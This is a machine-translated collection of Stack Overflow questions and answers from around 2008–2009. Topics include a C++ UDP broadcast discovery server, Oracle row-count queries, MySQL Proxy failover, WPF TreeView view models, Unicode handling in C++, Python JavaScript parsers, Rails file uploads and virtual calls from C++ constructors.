                  free(OverlappedBuffer);
                  BufferSize       = 0;
                  OverlappedBuffer = NULL;
                  bOverlapped      = false;
                  iOverlappedId    = 0;
                  BufferPosition   = 0;
                  BytesRecieved    = 0;
                  itemex           = NULL;
                  uiPacketNumber   = 0;
                  break;
               }
               TAdvertiseItemUpdate *item = new TAdvertiseItemUpdate;
               ZeroMemory(item, sizeof(TAdvertiseItemUpdate));
               memcpy(item, ap.PacketData, ap.dwPacketLength);

               item->pNMHDR.code     = (*theIterator).first;
               item->pNMHDR.hwndFrom = (*theIterator).second;
               item->pNMHDR.idFrom   = ADVERTISE_SERVER;
               SendMessage((*theIterator).second, WM_NOTIFY, 0, (LPARAM)item);
               delete item;
            }
            break;
         }
      }
   }
   try {
      ResetEvent(ServerMutex);
      CloseHandle(pThis->ServerMutex);
      closesocket(ServerSocket);
      return 0;
   }
   catch(...) {
      closesocket(ServerSocket);
      return -2;
   }
}

// Here's a couple of the helper functions that do the sending...
bool CAdvertiseServer::SendAdvertisement(TAdvertiseServerPacket packet)
{
   TCHAR ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
   ZeroMemory(ComputerName, sizeof(ComputerName));
   DWORD len = MAX_COMPUTERNAME_LENGTH;
   GetComputerName(ComputerName, &len);
   CString guid;
   guid.Format("%s%s", CDataAccess::DatabaseConfiguration(), ComputerName);

   strcpy(packet.GuidHash, CDataAccess::HashPassword(guid));

   bool bRetval = false;
   SOCKET s = socket(PF_INET, SOCK_DGRAM, 0);
   if(s != INVALID_SOCKET)
   {
      BOOL tru = TRUE;
      setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char *)&tru, sizeof(tru));
      sockaddr_in sin;
      ZeroMemory(&sin, sizeof(sin));
      sin.sin_family = PF_INET;
      sin.sin_port = htons(Port);
      sin.sin_addr.s_addr = INADDR_BROADCAST;
      if(sendto(s, (char *)&packet, sizeof(packet), 0, (sockaddr *)&sin, sizeof(sin)) > 0)
      {
         bRetval = true;
         if(packet.bRequestReply)
         {
           // Here is where your work comes in, in setting up a reply, or making a TCP connection back to the other client.
         }
      }
      closesocket(s);
   }
   return bRetval;
}

bool CAdvertiseServer::Advertise(UINT uiAdvertisement, long nItemId, bool bState, void *lpBuffer, DWORD dwDataSize, bool bBroadcast)
{
   TAdvertiseServerPacket packet;
   ZeroMemory(&packet, sizeof(packet));
   TAdvertiseItemUpdateEx   item;
   ZeroMemory(&item, sizeof(item));

   UINT packetnum = 1;
   packet.bOverlappedResult = true;
   packet.bRequestReply = false;
   packet.uiAdvertisePacketType = uiAdvertisement;
   packet.dwPacketLength = sizeof(item);
   packet.uiReplyType = packetnum;
   packet.bBroadcast = bBroadcast;
   item.nItemId = nItemId;
   item.bState  = bState;
   item.dwDataSize = dwDataSize;
   memcpy((void*)packet.PacketData, (void*)&item, sizeof(item));
   packet.iPacketId = GetTickCount();
   if(SendAdvertisement(packet))
   {
      BYTE *TempBuf = new BYTE[dwDataSize];
      memcpy(TempBuf, lpBuffer, dwDataSize);

      DWORD pos = 0;
      DWORD BytesLeft = dwDataSize;
      while(BytesLeft)
      {
         TOverlappedAdvertisement item;
         packet.uiAdvertisePacketType = ADVERTISE_OVERLAPPED;
         packet.bOverlappedResult = BytesLeft > 1020;
         item.iPacketId = packet.iPacketId;
         memcpy((void*)item.Data, (void*)&TempBuf[pos], (BytesLeft >= 1020 ? 1020 : BytesLeft));
         memcpy((void*)packet.PacketData, (void*)&item, sizeof(item));
         packet.dwPacketLength = sizeof(item);
         packet.uiReplyType++;
         if(SendAdvertisement(packet))
         {
            if(BytesLeft >= 1020)
            {
               BytesLeft -= 1020;
               pos += 1020;
            }
            else
            {
               BytesLeft = 0;
            }
         }
      }
      delete TempBuf;
   }
   return true;
}

void CAdvertiseServer::Shutdown()
{
   TAdvertiseServerPacket packet;
   packet.uiAdvertisePacketType = ADVERTISE_SHUTDOWN;
   SendAdvertisement(packet);
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-18T00:37:32.650

好的 - 所以 MQ 和那种东西听起来像是过度杀戮。

我对您的应用的理解：

在同一网络上的多台机器上运行的桌面应用程序 - 拥有自己的数据库，需要相互发现。

为什么不：

1）UDP广播/定期监听以“查找同一网络上的其他机器” - Java中的示例：http: [//java.sun.com/docs/books/tutorial/networking/datagrams/index.html](http://java.sun.com/docs/books/tutorial/networking/datagrams/index.html)

2）发现后使用SSL套接字进行实际通信：http:
[//stilius.net/java/java_ssl.php](http://stilius.net/java/java_ssl.php) ....
[http://www.exampledepot.com/egs/javax.net.ssl/Client.html](http://www.exampledepot.com/egs/javax.net.ssl/Client.html)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-02-18T18:47:31.717

您是否考虑过使用 Bittorrent 类型的设置？

使用的通信主体应该为您构建应用程序提供相当坚实的基础。您所需要的只是让两个节点相互了解，然后从那里构建。我使用[MonoTorrent](http://monotorrent.com/)来运行一个私有（100 节点）数据网络、一个 RSS 提要来宣布哪些文件需要放在哪里（Wordpress 的修改版本）并在 SSH 隧道中做所有事情。我确实有一个管理网络的中央服务器，但它可以很容易地存在于我的 100 个节点中的任何一个节点上。使用动态 DNS 服务，如果我的服务器出现故障，第一个活着的节点会设置它自己的跟踪器作为备份。

您可以使用 XML 文件作为您的消息传递方案，或者修改 Bittorrent 网络的传输以将数据包直接传输到您的应用程序。我认为您正在寻找的概念在 Bittorrent 中。如果网络上没有活动主机，第一个启动的节点将回收动态 DNS 条目（[DynDNS](http://www.dyndns.com/)有一个相当易于使用的[API ）。](http://www.dyndns.com/developers/specs/)（有一个缺点......当两个跟踪器在 TTL 窗口内启动时，我遇到了同步问题）

那里有很多关于[SSH 隧道](http://www.engadget.com/2006/03/21/how-to-ssh-tunnels-for-secure-network-access/)的参考资料，我只使用这个是因为有趣的图表。SSH 隧道不是最有效的可用方法，但它是一个非常好的替代方案，无需以编程方式将您的通信包装在 SSL 隧道中。

我知道这些想法有点混乱，我只是希望它能给你一点帮助，帮助你把自己指向正确的方向。PS...对于一个完全可移植的解决方案，您可以在 Java 或 .Net 中运行它（在 Mono 下运行..我有 AppleTV 甚至运行 Mono）。那么操作系统甚至可以成为您操作的灵活部分。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-24T07:38:35.870

听起来您需要分布式缓存或离线数据库功能 - 根据您的语言（java/c#/...），您可以使用各种选项...

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-02-13T06:43:13.760

Amazon 和 Microsoft 都有托管队列，您可以将其用作任意数量的连接、协作应用程序之间的集合点。亚马逊是商业的，不是免费的。 [微软](http://www.microsoft.com/azure/servicebus.mspx)目前是免费的，但不能保证永远免费。它完全解决了您面临的问题。为连接的客户端提供发布/订阅模型。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-02-13T17:10:11.693

我可能在这里遗漏了一些东西，但我没有看到您选择的编程语言。在基于 Windows 的环境中，使用 .Net 框架，最好的选择是使用 WCF，它允许您通过简单的配置添加安全性/稳健性。如果你想要一个基于 Windows 的计算机的解决方案，它不是面向 .Net 的，我会考虑使用 MSMQ，它是一个根据这些标准构建的通信框架。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-02-18T12:45:07.080

这里有一篇关于 P2P 与 WCF 的好文章 [http://msdn.microsoft.com/en-us/magazine/cc188685.aspx](http://msdn.microsoft.com/en-us/magazine/cc188685.aspx)。它提供代码，但假设 .Net3、Wcf、Vista 及更高版本

# oracle - 在 Oracle 中识别具有最大行数的表

> ID：390945
> 
> 赞同：5
> 
> 时间：2008-12-24T07:08:24.573
> 
> 标签：oracle, plsql

我在 Oracle 中有一组表，我想确定包含最大行数的表。

因此，如果 A 有 200 行，B 有 345 行，C 有 120 行，我希望能够识别表 B。

我可以运行一个简单的查询来实现这一点吗？

编辑：有 100 多个表，所以我正在寻找通用的东西。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-12-24T07:24:55.523

鉴于您说您使用的是 Oracle，我只会查询元数据。

```
select table_name, max(num_rows) from all_tables where table_name in ('A', 'B', 'C'); 
```

刚看到你的编辑。只需在没有 where 子句的情况下运行上面的代码，它将返回数据库中最大的表。唯一的问题可能是您可能会得到一个 SYS$ 表或其他东西。或者，如果您只是为了自己的知识而这样做

```
select table_name, num_rows from all_tables order by num_rows; 
```

你会看到最大的是什么。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-24T08:34:13.043

架构中具有最大行数的表：

```
with data as 
(
 select table_name,
        to_number(extractvalue(xmltype(
                  dbms_xmlgen.getxml (
                 ' select count(*) c from ' || table_name)),
                  '/ROWSET/ROW/C')) countrows
 from   user_tables
)
select table_name, countrows
from   data 
where  countrows = (select max(countrows)
                    from   data); 
```

dbms_xmlgen.getxml(' select .... ') 非常灵活。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-24T14:05:06.977

这是另一种方法，可能比简单地获取 ALL_TABLES.NUM_ROWS 慢得多，但它不依赖于已收集的统计数据并给出准确的当前值 - 尽管当前值取决于运行所需的时间！

```
-- For running in SQLPlus you need this to see the output.
-- If running in Toad or similar tool, output is enabled by default

    SET SERVEROUTPUT ON SIZE 100000

    DECLARE
      l_rows  INTEGER;
      l_max_rows  INTEGER := 0;
      l_table_name  all_tables.table_name%TYPE := NULL;
    BEGIN
      FOR table_record IN (SELECT table_name FROM all_tables) LOOP

        EXECUTE IMMEDIATE 'SELECT COUNT(*) FROM '||table_record.table_name
          INTO l_rows;

        IF l_rows > l_max_rows THEN
          l_max_rows := l_rows;
          l_table_name := table_record.table_name;
        END IF;
      END LOOP;

      IF l_table_name IS NULL THEN
        dbms_output.put_line( 'All tables are empty' );
      ELSE
        dbms_output.put_line( 'Table ' || table_record.table_name || 
                              ' has ' || TO_CHAR(l_max_rows) || ' rows'
                            );
      END IF;
    END;
    / 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-24T07:14:21.113

```
select max(select count(*) from A union select count(*) from B...) 
```

应该管用。

编辑：如果你想要一些动态的东西，你可以在 PL/SQL 中使用每个“count(*)”子查询构建一个字符串（例如，列出来自 USER_TABLES 的表名），然后使用以下命令执行主查询：

```
execute immediate 'select max('||subquery||')' 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-29T16:00:55.413

您可以使用这样的数据拖网获得相同的结果：

```
SELECT     DISTINCT
           FIRST_VALUE ( t.owner )
             OVER ( ORDER BY t.num_rows DESC NULLS LAST )
                                                 owner,
           FIRST_VALUE ( t.table_name )
             OVER ( ORDER BY t.num_rows DESC NULLS LAST )
                                                 table_name,
           FIRST_VALUE ( t.num_rows )
             OVER ( ORDER BY t.num_rows DESC NULLS LAST )
                                                 num_rows
FROM       all_tables                            t 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-29T23:51:06.713

David Aldridge 正确地指出，查询 all_tables 可能会由于缺少或陈旧的表统计信息而给出不正确的结果。但是使用user_segments也有问题；高水位线以下的已删除块仍将计入表的大小。

例子：

```
SQL>create table t as select * from all_objects

Table created.

SQL>select blocks, bytes from user_segments where segment_name = 'T';

    BLOCKS      BYTES
---------- ----------
       768    6291456

SQL>delete from t

52676 rows deleted.

SQL>commit;

Commit complete.

SQL>select count(*) from t;

  COUNT(*)
----------
         0

SQL>select blocks, bytes from user_segments where segment_name = 'T';

    BLOCKS      BYTES
---------- ----------
       768    6291456

SQL>truncate table t;

Table truncated.

SQL>select blocks, bytes from user_segments where segment_name = 'T';

    BLOCKS      BYTES
---------- ----------
         8      65536 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-09-27T11:08:21.393

这是一个查询，用于获取数据库表中的最大行数。

```
select table_name, num_rows from USER_TABLES
where num_rows = (select  max(num_rows) from
(select table_name, num_rows from USER_TABLES)); 
```

# mysql - 使用 MySQL 代理的 MySQL 故障转移

> ID：390958
> 
> 赞同：2
> 
> 时间：2008-12-24T07:23:38.037
> 
> 标签：mysql, database, failover, mysql-proxy

我正在考虑使用 MySQL 代理 ( [http://forge.mysql.com/wiki/MySQL_Proxy](http://forge.mysql.com/wiki/MySQL_Proxy) )为 MySQL 数据库实现故障转移机制

我建议的设置如下：一台主动 MySQL 服务器和一台被动 MySQL，两者之间启用了双向复制。MySQL Proxy 是位于这两个服务器之间的故障转移，并将流量重定向到备用服务器，以防活动服务器发生故障，反之亦然。

只是想在这里了解社区关于使用 MySQL Proxy 作为两台 MySQL 服务器的故障转移工具的经验。有什么我应该注意的问题吗？任何其他可以即兴设置此设置的提示/调整/黑客？

哦，我在 Windows 上，因此需要 MySQL 代理。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-28T10:00:05.627

MySQL Proxy 是一个有效的解决方案，很多人一直将它用于高流量生产系统。有几件事要记住：

*   它仍处于 Alpha 阶段，因此您真的想在实施之前对其进行彻底测试。
*   如果代理服务器出现故障，您的应用程序应该具有故障转移方法。如果它是一个网站，也许是一个“我们很快就会回来”的消息和一个通知系统，告诉您它已关闭。MySQL Enterprise Manager 在这方面做得很好，尽管它确实要花钱。
*   它会比硬件负载均衡器增加更多的延迟，但它允许您使用 Lua 对其进行更多自定义。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-02T13:10:28.007

我使用 MySQL 代理已经有一段时间了，发现它非常有用。然而，与 0.6.0 相比，0.6.1 版本中似乎引入了新的错误。因此，您可能需要谨慎选择版本。我认为这是一个非常适合故障转移和查询注入的产品，但由于它处于 Alpha 阶段，因此会出现错误。

[http://forums.mysql.com/read.php?146,202953,202953#msg-202953](http://forums.mysql.com/read.php?146,202953,202953#msg-202953)

# wpf - 涉及树视图的WPF设计问题

> ID：390975
> 
> 赞同：0
> 
> 时间：2008-12-24T07:35:21.727
> 
> 标签：wpf, treeview

我有一个看起来像这样的层次结构 - 工厂>机器>组件>控件，其中“>”可以读作“包含列表”。

这非常适合使用 HierarchicalDataTemplates 的 TreeView。现在说我想在树中添加复选框，以便用户可以创建需要控制的树的“视图”。目前我的模板是绑定到实际机器/组件/控制对象的数据，就像这样......

```
<HierarchicalDataTemplate DataType="{x:Type src:Component}" ItemsSource = "{Binding Path=Controls}">
    <StackPanel Orientation="Horizontal">
        <CheckBox IsChecked="False" />
        <TextBlock Text="{Binding Path=Name}"/>
    </StackPanel>
</HierarchicalDataTemplate> 
```

我不想更改我的机器/组件/控件类的代码，以便能够处理“视图”创建。换句话说，我想将“数据模型”代码和 UI 代码分开。例如，要处理复选框，我需要将其绑定到控件的 IsSelected 属性。我发现自己在这些类中添加了一堆属性和通知代码。我尝试的另一种选择是为每个机器/组件/控制类创建一个“视图”类。使用这种方法，我最终在“视图”类中创建了数据的副本，并且必须将其与实际数据同步。有什么好方法可以做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T16:39:16.917

这两篇 CodeProject 文章帮助了我：

*   [http://www.codeproject.com/KB/WPF/TreeViewWithCheckBoxes.aspx](http://www.codeproject.com/KB/WPF/TreeViewWithCheckBoxes.aspx)
*   [http://www.codeproject.com/KB/WPF/TreeViewWithViewModel.aspx](http://www.codeproject.com/KB/WPF/TreeViewWithViewModel.aspx)

# c++ - 如何使用 STL 字符串和流读取/存储 unicode

> ID：390977
> 
> 赞同：9
> 
> 时间：2008-12-24T07:40:06.707
> 
> 标签：c++, string, unicode, stl, stream

我需要修改我的程序以接受 Unicode，它可能来自任何 UTF-8 以及各种 UTF-16 和 UTF-32 编码。我对 Unicode 了解不多（尽管我读过 Joel Spolsky 的[文章](http://www.joelonsoftware.com/articles/Unicode.html)和 [维基百科页面](http://en.wikipedia.org/wiki/Unicode)）。

现在我正在使用 an`std::istream`并读取我的输入`char`，`char`然后将（必要时）存储在`std::string`. 我想

*   修改它（不费吹灰之力）以支持上述编码，并且
*   弄清楚如何测试上述编码（我有点像白面包美国人，甚至不知道如何用另一种编码制作示例文本文件），理想情况下
*   以跨平台的方式执行此操作。

另外，如果可能的话，我想尽可能地节省空间（所以如果我们不需要超过一个字节/字符，我们就不会使用它）。据我了解，这意味着以 UTF-8 存储，这很好，但我不知道执行此操作的标准字符串（据我了解，`wchar_t`具有实现定义的大小和编码）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T07:51:17.933

只要您主要使用标准 ASCII 字符，UTF-8 就可以节省空间。

std::string 对 UTF-8 没有问题，因为其中没有 0 字节。您可以告诉 std::string 输入字符的长度，如果它们有 NULL 字节，就像在 UTF-32 中一样。std::string 无法告诉您 UTF-8 字符串有多少个字符，您必须使用外部函数。

此外，还有一个使用 wchar_t 的 std::string 的广泛版本，而不是 char，我只是忘记了名字。

编码之间的转换也有一些方面的提升。

您可以使用带有 boost 的标准库。或者，您可以使用 C 库中的字符串处理函数。还有Qt、Tcl等编程框架提供的功能。

参见例如：

[utf8 编解码器方面](http://www.boost.org/doc/libs/1_37_0/libs/serialization/doc/codecvt.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-24T09:03:07.647

看看[嵌入式应用程序从 std::string 到 std::wstring 的切换？](https://stackoverflow.com/questions/163962/switching-from-stdstring-to-stdwstring-for-embedded-applications)问题

> 正如 Pukku 所说：您可能会有些头疼，因为[C++ 标准规定在写入文件时需要宽流将双字节字符转换为单字节，而这种转换的完成方式取决于实现.](http://www.codeproject.com/KB/stl/upgradingstlappstounicode.aspx)

# javascript - Python 中的 JavaScript 解析器

> ID：390992
> 
> 赞同：61
> 
> 时间：2008-12-24T07:56:36.143
> 
> 标签：javascript, python, parsing, compiler-construction

至少在 C 和 Java（Mozilla）、JavaScript（又是 Mozilla）和 Ruby 中有一个 JavaScript 解析器。目前有 Python 的吗？

我本身不需要 JavaScript 解释器，只需要一个符合 ECMA-262 标准的解析器。

一个快速的谷歌搜索显示没有立即的答案，所以我问 SO 社区。

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2014-08-04T05:09:39.970

如今，至少有一种更好的工具，称为[`slimit`](https://pypi.python.org/pypi/slimit)：

> SlimIt 是一个用 Python 编写的 JavaScript 压缩器。它将 JavaScript 编译成更紧凑的代码，以便更快地下载和运行。
> 
> SlimIt 还提供了一个包含 JavaScript 解析器、词法分析器、漂亮打印机和树访问器的库。

演示：

假设我们有以下 javascript 代码：

```
$.ajax({
    type: "POST",
    url: 'http://www.example.com',
    data: {
        email: 'abc@g.com',
        phone: '9999999999',
        name: 'XYZ'
    }
}); 
```

现在我们需要从对象中获取`email`,`phone`和`name`值。`data`

这里的想法是实例化一个`slimit`解析器，访问所有节点，过滤所有分配并将它们放入字典中：

```
from slimit import ast
from slimit.parser import Parser
from slimit.visitors import nodevisitor

data = """
$.ajax({
    type: "POST",
    url: 'http://www.example.com',
    data: {
        email: 'abc@g.com',
        phone: '9999999999',
        name: 'XYZ'
    }
});
"""

parser = Parser()
tree = parser.parse(data)
fields = {getattr(node.left, 'value', ''): getattr(node.right, 'value', '')
          for node in nodevisitor.visit(tree)
          if isinstance(node, ast.Assign)}

print fields 
```

它打印：

```
{'name': "'XYZ'", 
 'url': "'http://www.example.com'", 
 'type': '"POST"', 
 'phone': "'9999999999'", 
 'data': '', 
 'email': "'abc@g.com'"} 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2008-12-24T09:18:41.157

> [ANTLR](http://www.antlr.org/)是另一种语言识别工具，它提供了一个框架，用于从包含各种目标语言动作的语法描述构建识别器、解释器、编译器和翻译器。

ANTLR 站点提供了[许多语法](https://github.com/antlr/grammars-v4)，包括[一种用于 JavaScript 的](https://github.com/antlr/grammars-v4/tree/master/javascript)语法。

碰巧的是，有一个[Python API](https://github.com/antlr/antlr4/blob/master/doc/python-target.md)可用 - 所以你可以直接从 Python 调用从语法生成的词法分析器（识别器）（祝你好运）。

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2014-12-15T00:37:52.177

我已将[esprima.js](https://github.com/jquery/esprima)翻译成 Python：

[https://github.com/PiotrDabkowski/pyjsparser](https://github.com/PiotrDabkowski/pyjsparser)

```
>>> from pyjsparser import parse
>>> parse('var $ = "Hello!"')
{
"type": "Program",
"body": [
    {
        "type": "VariableDeclaration",
        "declarations": [
            {
                "type": "VariableDeclarator",
                "id": {
                    "type": "Identifier",
                    "name": "$"
                },
                "init": {
                    "type": "Literal",
                    "value": "Hello!",
                    "raw": '"Hello!"'
                }
            }
        ],
        "kind": "var"
    }
  ]
} 
```

这是一个手动翻译，所以它非常快，解析文件大约需要 1 秒`angular.js`（所以每秒 100k 个字符）。它支持整个 ECMAScript 5.1 和版本 6 的部分内容 - 例如箭头函数`const`、`let`.

如果您需要对所有最新 JS6 功能的支持，您可以使用 Js2Py 即时翻译[esprima](https://github.com/PiotrDabkowski/Js2Py)：

```
import js2py
esprima = js2py.require("esprima@4.0.1")
esprima.parse("a = () => {return 11};")
# {'body': [{'expression': {'left': {'name': 'a', 'type': 'Identifier'}, 'operator': '=', 'right': {'async': False, 'body': {'body': [{'argument': {'raw': '11', 'type': 'Literal', 'value': 11}, 'type': 'ReturnStatement'}], 'type': 'BlockStatement'}, 'expression': False, 'generator': False, 'id': None, 'params': [], 'type': 'ArrowFunctionExpression'}, 'type': 'AssignmentExpression'}, 'type': 'ExpressionStatement'}], 'sourceType': 'script', 'type': 'Program'} 
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2012-01-06T02:07:46.927

正如 pib 所提到的，[pynarcissus](http://code.google.com/p/pynarcissus/)是一个用 Python 编写的 Javascript 分词器。它似乎有一些粗糙的边缘，但到目前为止，我想要完成的工作一直很好。

更新：对 pynarcissus 进行了另一次破解，以下是在访问者模式（如系统）中使用 PyNarcissus 的工作方向。不幸的是，我当前的客户购买了我的下一个实验版本，并决定不将其公开。下面的代码的更简洁的版本是要点[here](https://gist.github.com/1598830/495dc623541ffe3f5a95d6822b9b42cab09def1b)

```
from pynarcissus import jsparser
from collections import defaultdict

class Visitor(object):

    CHILD_ATTRS = ['thenPart', 'elsePart', 'expression', 'body', 'initializer']

def __init__(self, filepath):
    self.filepath = filepath
    #List of functions by line # and set of names
    self.functions = defaultdict(set)
    with open(filepath) as myFile:
        self.source = myFile.read()

    self.root = jsparser.parse(self.source, self.filepath)
    self.visit(self.root)

def look4Childen(self, node):
    for attr in self.CHILD_ATTRS:
        child = getattr(node, attr, None)
        if child:
            self.visit(child)

def visit_NOOP(self, node):
    pass

def visit_FUNCTION(self, node):
    # Named functions
    if node.type == "FUNCTION" and getattr(node, "name", None):
        print str(node.lineno) + " | function " + node.name + " | " + self.source[node.start:node.end]

def visit_IDENTIFIER(self, node):
    # Anonymous functions declared with var name = function() {};
    try:
        if node.type == "IDENTIFIER" and hasattr(node, "initializer") and node.initializer.type == "FUNCTION":
            print str(node.lineno) + " | function " + node.name + " | " + self.source[node.start:node.initializer.end]
    except Exception as e:
        pass

def visit_PROPERTY_INIT(self, node):

    # Anonymous functions declared as a property of an object
    try:
        if node.type == "PROPERTY_INIT" and node[1].type == "FUNCTION":
            print str(node.lineno) + " | function " + node[0].value + " | " + self.source[node.start:node[1].end]
    except Exception as e:
        pass

def visit(self, root):

    call = lambda n: getattr(self, "visit_%s" % n.type, self.visit_NOOP)(n)
    call(root)
    self.look4Childen(root)
    for node in root:
        self.visit(node)

filepath = r"C:\Users\dward\Dropbox\juggernaut2\juggernaut\parser\test\data\jasmine.js"
outerspace = Visitor(filepath) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-24T09:39:05.970

你可以试试[python-spidermonkey](http://wwwsearch.sourceforge.net/python-spidermonkey/)[它](http://www.mozilla.org/js/spidermonkey/) 是 spidermonkey 的一个包装器，它是 Mozilla 的 javascript 的 C 实现的代号。

# ruby-on-rails - 使用 ruby /rails 将文件上传到网站

> ID：390993
> 
> 赞同：3
> 
> 时间：2008-12-24T07:58:56.857
> 
> 标签：ruby-on-rails, ruby, upload

我正在构建一个 Rails 应用程序来测试我们的旗舰产品（也是基于 Web 的）。问题是部分测试需要使用生产应用程序的 Web 界面来上传文件。所以我需要做的是让 rails 应用程序将这些文件上传到生产应用程序（而不是 rails）。有没有办法让 Rails 将文件发布到生产应用程序（就像浏览器将文件发布到生产应用程序一样）？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-25T10:27:06.870

If you just need to upload files, I think it's pointless to use a plugin for this. File upload is very, very simple.

```
class Upload < ActiveRecord::Base
  before_create :set_filename
  after_create :store_file
  after_destroy :delete_file

  validates_presence_of :uploaded_file

  attr_accessor :uploaded_file

  def link
    "/uploads/#{CGI.escape(filename)}"
  end

  private

  def store_file
    File.open(file_storage_location, 'w') do |f|
      f.write uploaded_file.read
    end
  end

  def delete_file
    File.delete(file_storage_location)
  end

  def file_storage_location
    File.join(Rails.root, 'public', 'uploads', filename)
  end

  def set_filename
    self.filename = random_prefix + uploaded_file.original_filename
  end

  def random_prefix
    Digest::SHA1.hexdigest(Time.now.to_s.split(//).sort_by {rand}.join)
  end
end 
```

Then, your form can look like this:

```
<% form_for @upload, :multipart => true do |f| %>
  <%= f.file_field :uploaded_file %>
  <%= f.submit "Upload file" %>
<% end %> 
```

I think the code is pretty much self explanatory, so I won't explain it ; )

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-24T08:05:13.180

当然，使用 net/http 库...

[http://www.ruby-doc.org/stdlib/libdoc/net/http/rdoc/classes/Net/HTTP.html](http://www.ruby-doc.org/stdlib/libdoc/net/http/rdoc/classes/Net/HTTP.html)

但它似乎缺少多部分编码，因此请查看另一篇文章

[http://kfahlgren.com/blog/2006/11/01/multipart-post-in-ruby-2/](http://kfahlgren.com/blog/2006/11/01/multipart-post-in-ruby-2/)

看看这个类似的问题

[Ruby：如何通过 HTTP 将文件作为 multipart/form-data 发布？](https://stackoverflow.com/questions/184178/ruby-how-to-post-a-file-via-http-as-multipartform-data)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-24T14:38:43.570

您可能想查看 Paperclip 插件。非常适合上传图片。也可能适用于其他格式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-06-19T11:46:51.623

Paperclip gem 确实是一个解决方案。它也适用于其他格式，并且很容易在 Rails 中实现。看视频..!!

[http://railscasts.com/episodes/134-paperclip](http://railscasts.com/episodes/134-paperclip)

# c++ - 当虚拟不工作时

> ID：390997
> 
> 赞同：3
> 
> 时间：2008-12-24T08:04:42.960
> 
> 标签：c++, visual-studio, wxwidgets, virtual

目前我的 C++ 类中有一个奇怪的错误。我有一个 ActiveX 包装类（作为 wxWidgets 的一部分），我添加了一个新的虚函数。我有另一个类继承自 ActiveX 类（wxIEHtmlWin），但是 ActiveX 类总是调用它自己的函数，而不是 wxIEHtmlWin 中覆盖它的函数。

我无法弄清楚为什么会这样。我将函数设为纯虚拟函数，现在程序在执行函数调用时崩溃，但编译正常。有什么方法可以禁用虚拟功能或者我在 Visual Studio 中发现了一个错误？

ActiveX 类

```
protected:
virtual FrameSite* getNewFrameSite()=0; 
```

wxIEHtmlWin 类

```
class wxIEHtmlWin : public wxActiveX
{
protected:
    FrameSite* getNewFrameSite();
}

FrameSite* wxIEHtmlWin::getNewFrameSite()
{
    return new gcFrameSite(this);
} 
```

编辑：我添加了另一个测试函数（返回一个 int）并且仍然搞砸了。

有问题的代码链接：http: [//lodle.net/public/iebrowser.rar](http://lodle.net/public/iebrowser.rar)

编辑：

好的，感谢下面的答案，我让它工作了。我所做的是分两部分创建activex类（如建议的那样），但是在wxIEHtmlWin中，我在构造函数代码中调用了第二部分。像这样：

```
wxIEHtmlWin::wxIEHtmlWin(wxWindow * parent, wxWindowID id, const wxPoint& pos,const wxSize& size,long style, const wxString& name) : wxActiveX()
{
    wxActiveX::Create(parent, PROGID, id, pos, size, style, name);
    SetupBrowser();
} 
```

现在我知道为什么 wxWidgets 支持两部分构造。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-24T08:23:30.943

您正在从类的构造函数中调用虚拟方法（通过另一个调用）。这将调用当前类的方法，因为子类尚未构建。解决方法是使用 init() 方法并在构造类后调用它。

即是这样的：

```
class wxActivex {
  wxActivex() {}
  virtual void init() {
    getNewFrame();
  }
};

  // in the code that uses these classes:
  wxActivex *activex = new IEHtmlFrame();
  activex->init(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-03T13:35:52.710

可以在[此处](https://stackoverflow.com/questions/496440/c-virtual-function-from-constructor)找到此问题的更“简化”版本。但简而言之，基对象（还）不是派生类型的实例，因此不能在派生对象上调用任何重载函数。*********